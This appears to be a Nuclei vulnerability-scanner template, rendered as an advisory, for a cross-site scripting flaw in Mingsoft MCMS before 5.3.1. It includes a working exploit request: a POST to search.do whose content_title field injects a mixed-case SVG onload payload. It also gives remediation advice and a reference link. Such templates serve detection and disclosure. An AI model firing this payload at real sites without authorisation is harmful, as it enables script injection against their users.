# Nuclei Template: Mingsoft MCMS < 5.3.1 - Cross-Site Scripting
**Template ID:** mcms-search-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`mcms-search-xss.yaml`)

## Vulnerability Information & PoC

## Description
A vulnerability classified as problematic has been found in Mingsoft MCMS up to 5.3.1. This affects an unknown part of the file search.do of the component HTTP POST Request Handler.

## Impact
Successful exploitation could lead to unauthorized access to sensitive data.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

POST /mcms/search.do HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

content_title=1"><sVg/Onload=alert`document.domain`></p>
```

## Remediation
We recommend that you update to the latest version 5.4 or above.

## References
- https://gitee.com/mingSoft/MCMS/issues/I5MT8Y
